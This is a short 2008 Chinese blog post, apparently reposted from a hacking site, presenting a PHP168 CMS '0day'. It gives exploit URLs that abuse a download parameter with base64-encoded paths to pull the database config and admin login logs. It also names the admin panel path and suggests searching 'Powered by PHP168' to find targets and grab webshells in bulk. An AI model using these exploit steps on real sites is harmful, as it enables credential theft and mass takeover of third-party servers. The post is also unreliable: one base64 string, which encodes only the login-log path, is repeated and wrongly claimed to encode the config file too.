---
title: PHP168整站系统0DAY
description: PHP168cms整站系统0day 先说明下是这个漏洞是在其他地方看到的，只是他没有说的很清楚，好多菜菜都不明白，我就拿这发我的第一个贴吧！这个漏洞其实就是利用了程序的编码漏洞，下载配置和登陆日志文件，以下是利用方法。
date: 2008-11-02 09:10:17
category: 漏洞信息
tags: ['PHP168', '0day']
post_id: 664
alias: PHP168-0day
ViewNums: 4534
---

**[PHP168 cms整站系统 0day](/blog/php168-0day)**

先说明下是这个[漏洞](/tags/%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF)是在其他地方看到的，只是他没有说的很清楚，好多菜菜都不明白，我就拿这发我的第一个贴吧！
这个[漏洞](http://www.15897.com/category/6)其实就是利用了程序的编码漏洞，下载配置和登陆日志文件，以下是利用方法。

下载 mysql_config.php 和 adminlogin_logs.php 两个文件到本地。
http://dabei.org//job.php?job=download&url="aHR0cDovL2RhYmVpLm9yZy8vY2FjaGUvYWRtaW5sb2dpbl9sb2dzLnBocA=="
http://dabei.org//job.php?job=download&url="aHR0cDovL2RhYmVpLm9yZy8vY2FjaGUvYWRtaW5sb2dpbl9sb2dzLnBocA=="

程序后台：
http://dabei.org/admin/index.php?iframe=1

Base64加密代码：
http://dabei.org//cache/adminlogin_logs.php == "aHR0cDovL2RhYmVpLm9yZy8vY2FjaGUvYWRtaW5sb2dpbl9sb2dzLnBocA=="

(引号里面的是Base64加密后的)
http://dabei.org//php168/mysql_config.php == "aHR0cDovL2RhYmVpLm9yZy8vY2FjaGUvYWRtaW5sb2dpbl9sb2dzLnBocA=="

(引号里面的是Base64加密后的)

批量抓webshell：
google,baidu 输入关键字：Powered by PHP168

From: http://www.hack58.net/Article/html/3/62/2008/20875.htm

